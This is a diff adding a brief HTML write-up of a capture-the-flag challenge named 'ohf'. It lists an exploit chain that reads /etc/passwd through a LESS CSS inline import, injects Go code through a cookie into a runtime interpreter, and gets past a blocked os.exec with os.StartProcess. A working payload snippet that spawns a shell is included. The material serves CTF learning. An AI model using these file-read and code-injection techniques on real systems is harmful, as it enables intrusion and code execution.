@@ -1,0 +1,20 @@
+<h1>ohf</h1>
+
+<p>Interesting challenge:
+- <a href="https://lesscss.org/">lesscs</a> is used to evaluate CSS on the backend. Can read arbitrary files with <code>@import (inline) "/etc/passwd";</code>
+- Leak source code
+- Uses <a href="https://github.com/traefik/yaegi">interp</a> to evaluate golang at runtime from cookie
+- Control <code>Version</code> in cookie, get arbitrary code execution
+- Realize <code>os.exec</code> is blocked, use <code>os.StartProcess</code> instead
+<code>
+    import "io/ioutil"
+    import "os"
+    func api() string {
+        v, _ := ioutil.ReadFile("satellite.txt")
+        var procAttr os.ProcAttr
+        procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
+        p, _ := os.StartProcess("/bin/sh", []string{"/bin/sh", "-c", "/readflag &gt; /tmp/jizz"}, &amp;procAttr)
+        p.Wait()
+        return string(v)
+    }
+</code></p>
